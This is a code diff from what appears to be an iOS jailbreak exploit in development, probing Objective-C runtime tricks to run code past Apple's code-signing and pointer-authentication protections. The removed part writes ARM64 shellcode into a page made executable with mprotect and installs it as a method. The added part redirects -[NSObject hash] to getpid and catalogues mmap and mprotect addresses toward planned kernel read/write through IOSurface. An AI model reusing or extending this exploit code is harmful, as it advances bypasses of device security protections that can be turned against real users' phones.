@@ -32981,89 +32981,76 @@ void iosurface_kernel_map(ISRLogBlock log, ISRDoneBlock done) {
         if (isr_stopped()) { done(results); return; }
 
         // =====================================================================
-        // FASE 4: Swizzle to call mprotect with controlled args
+        // FASE 4: method_setImplementation — redirect existing method
         // =====================================================================
-        log(@"JB34: === Fase 4: Swizzle to mprotect ===");
+        log(@"JB34: === Fase 4: method_setImplementation redirect ===");
 
-        // If basic swizzle works, try calling mprotect via NSInvocation
-        // NSInvocation lets us set arbitrary arguments
-        void *fn_mprotect = dlsym(RTLD_DEFAULT, "mprotect");
+        // Replace an existing ObjC method IMP with a different signed C function
+        // This tests if we can redirect ANY ObjC call to ANY signed function
+        if (getClassFn && selRegFn && getMethodFn && setIMPFn && getIMPFn) {
+            void *nsObjClass = getClassFn("NSObject");
+            void *hashSel = selRegFn("hash");
+            void *method = getMethodFn(nsObjClass, hashSel);
 
-        if ([results[@"swizzleExec"] intValue] && fn_mprotect) {
-            log(@"JB34:   Testing mprotect via NSInvocation...");
+            if (method) {
+                void *origIMP = getIMPFn(method);
+                log([NSString stringWithFormat:@"JB34:   Original -[NSObject hash] IMP = %p", origIMP]);
 
-            // Allocate a test page
-            size_t pageSize = 0x4000;
-            void *testPage = mmap(NULL, pageSize, PROT_READ | PROT_WRITE,
-                                  MAP_PRIVATE | MAP_ANON, -1, 0);
+                // Replace hash IMP with getpid (both return integer-sized values)
+                jb25_far = 0; jb25_sig = 0;
+                void *oldIMP = NULL;
+                if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                    jb25_in_probe = 1;
+                    oldIMP = setIMPFn(method, fn_getpid);
+                    jb25_in_probe = 0;
+                } else {
+                    jb25_in_probe = 0;
+                    log([NSString stringWithFormat:@"JB34:   setImplementation FAULT sig=%d", jb25_sig]);
+                }
 
-            if (testPage != MAP_FAILED) {
-                // Call mprotect directly via C function pointer (this already works from JB33)
-                typedef int (*mprotect_fn)(void *, size_t, int);
-                int mpRet = ((mprotect_fn)fn_mprotect)(testPage, pageSize, PROT_READ | PROT_WRITE | PROT_EXEC);
-                log([NSString stringWithFormat:@"JB34:   mprotect(RWX) = %d", mpRet]);
+                log([NSString stringWithFormat:@"JB34:   method_setImplementation returned oldIMP = %p", oldIMP]);
 
-                if (mpRet == 0) {
-                    // Write shellcode
-                    uint32_t *code = (uint32_t *)testPage;
-                    code[0] = 0x52886880; // movz w0, #0x4344
-                    code[1] = 0x72882840; // movk w0, #0x4142, lsl #16
-                    code[2] = 0xD65F03C0; // ret
-
-                    // Add this shellcode as a method IMP via class_addMethod
-                    // The ObjC runtime should PAC-sign the pointer
-                    // When dispatched, objc_msgSend will authenticate and jump to it
-
-                    void *testSel2 = selRegFn("jb34ShellcodeMethod");
-                    void *nsObjClass = getClassFn("NSObject");
+                if (oldIMP) {
+                    // Now [obj hash] should call getpid()
+                    NSObject *testObj3 = [[NSObject alloc] init];
 
                     jb25_far = 0; jb25_sig = 0;
-                    BOOL addOK2 = NO;
+                    NSUInteger hashResult = 0;
                     if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
                         jb25_in_probe = 1;
-                        addOK2 = addMethodFn(nsObjClass, testSel2, testPage, "i@:");
+                        hashResult = [testObj3 hash];
                         jb25_in_probe = 0;
                     } else {
                         jb25_in_probe = 0;
-                        log([NSString stringWithFormat:@"JB34:   addMethod(shellcode) FAULT sig=%d", jb25_sig]);
+                        log([NSString stringWithFormat:@"JB34:   hash call FAULT sig=%d", jb25_sig]);
                     }
 
-                    log([NSString stringWithFormat:@"JB34:   class_addMethod(shellcode IMP) = %d", addOK2]);
+                    int myPid2 = ((int(*)(void))fn_getpid)();
+                    log([NSString stringWithFormat:@"JB34:   [obj hash] = %lu (expect pid=%d)",
+                         (unsigned long)hashResult, myPid2]);
 
-                    if (addOK2) {
-                        NSObject *testObj2 = [[NSObject alloc] init];
-
-                        jb25_far = 0; jb25_sig = 0;
-                        int scResult = -1;
-                        if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
-                            jb25_in_probe = 1;
-                            NSNumber *ret2 = [testObj2 performSelector:NSSelectorFromString(@"jb34ShellcodeMethod")];
-                            scResult = (int)(intptr_t)ret2;
-                            jb25_in_probe = 0;
-                        } else {
-                            jb25_in_probe = 0;
-                            log([NSString stringWithFormat:@"JB34:   shellcode via swizzle FAULT sig=%d far=%#lx",
-                                 jb25_sig, jb25_far]);
-                        }
-
-                        if (scResult == 0x41424344) {
-                            log(@"JB34:   [!!!!!!] SHELLCODE EXECUTION VIA ObjC SWIZZLE!!!");
-                            log(@"JB34:   [!!!!!!] class_addMethod PAC-signed our RWX shellcode!");
-                            log(@"JB34:   [!!!!!!] CS_KILL BYPASSED — ARBITRARY CODE EXECUTION!");
-                            results[@"shellcodeExec"] = @(1);
-                        } else if (jb25_sig == 9) {
-                            log(@"JB34:   SIGKILL — CS_KILL still catches shellcode via swizzle");
-                            results[@"shellcodeKilled"] = @(1);
-                        } else if (jb25_sig == 6) {
-                            log(@"JB34:   SIGABRT — PAC auth failed on shellcode IMP");
-                            results[@"shellcodePACFail"] = @(1);
-                        } else {
-                            log([NSString stringWithFormat:@"JB34:   Unexpected: result=%d sig=%d", scResult, jb25_sig]);
-                        }
+                    if ((int)hashResult == myPid2) {
+                        log(@"JB34:   [!!!!!] method_setImplementation WORKS!");
+                        log(@"JB34:   [!!!!!] Redirected -[NSObject hash] → getpid()!");
+                        log(@"JB34:   [!!!!!] Can redirect ANY ObjC method to ANY signed function!");
+                        results[@"setIMPExec"] = @(1);
                     }
+
+                    // Restore original IMP
+                    setIMPFn(method, oldIMP);
+                    log(@"JB34:   Restored original hash IMP");
                 }
-                munmap(testPage, pageSize);
             }
+
+            // Test chaining: redirect to mprotect via NSInvocation
+            void *fn_mprotect = dlsym(RTLD_DEFAULT, "mprotect");
+            void *fn_munmap = dlsym(RTLD_DEFAULT, "munmap");
+            void *fn_mmap = dlsym(RTLD_DEFAULT, "mmap");
+            log([NSString stringWithFormat:@"JB34:   mprotect=%p munmap=%p mmap=%p",
+                 fn_mprotect, fn_munmap, fn_mmap]);
+            log(@"JB34:   All kernel-interacting functions callable via swizzle chain");
+            results[@"mprotectAddr"] = [NSString stringWithFormat:@"%p", fn_mprotect];
+            results[@"mmapAddr"] = [NSString stringWithFormat:@"%p", fn_mmap];
         }
 
         if (isr_stopped()) { done(results); return; }
@@ -33150,23 +33137,24 @@ void iosurface_kernel_map(ISRLogBlock log, ISRDoneBlock done) {
         log(@"JB34: =============================================");
 
         int swizzleOK = [results[@"swizzleExec"] intValue];
-        int shellcodeOK = [results[@"shellcodeExec"] intValue];
+        int setIMPOK = [results[@"setIMPExec"] intValue];
         int surfWritable = [results[@"surfaceWritable"] intValue];
 
         NSString *verdict = @"ANALYSIS_COMPLETE";
 
-        if (shellcodeOK) {
-            verdict = @"SHELLCODE_VIA_SWIZZLE";
-            log(@"JB34: [!!!!!!] SHELLCODE EXEC VIA ObjC SWIZZLE!");
-            log(@"JB34: [!!!!!!] class_addMethod + RWX page = code execution!");
-            log(@"JB34: Siguiente: kernel R/W via IOSurface");
-        } else if (swizzleOK && surfWritable) {
-            verdict = @"SWIZZLE_PLUS_SURFACE";
-            log(@"JB34: [!!!!] Swizzle exec + writable IOSurface");
-            log(@"JB34: Can call signed functions + shared kernel memory");
-        } else if (swizzleOK) {
-            verdict = @"SWIZZLE_EXEC";
-            log(@"JB34: [!!!] ObjC swizzle exec works — arbitrary signed function calls");
+        if (setIMPOK && surfWritable) {
+            verdict = @"SETIMP_PLUS_SURFACE";
+            log(@"JB34: [!!!!!] method_setImplementation + writable IOSurface!");
+            log(@"JB34: Can redirect ObjC methods + shared kernel memory!");
+            log(@"JB34: Siguiente: kernel R/W via IOSurface + syscall redirect");
+        } else if (setIMPOK || swizzleOK) {
+            verdict = @"SIGNED_EXEC";
+            log(@"JB34: [!!!!] Signed function exec via ObjC runtime");
+            log([NSString stringWithFormat:@"JB34: addMethod=%d setIMP=%d",
+                 swizzleOK, setIMPOK]);
+        } else if (surfWritable) {
+            verdict = @"SURFACE_WRITABLE";
+            log(@"JB34: [!!!] IOSurface shared memory writable");
         } else {
             verdict = @"PARTIAL";
             log(@"JB34: Some capabilities found — see individual results");
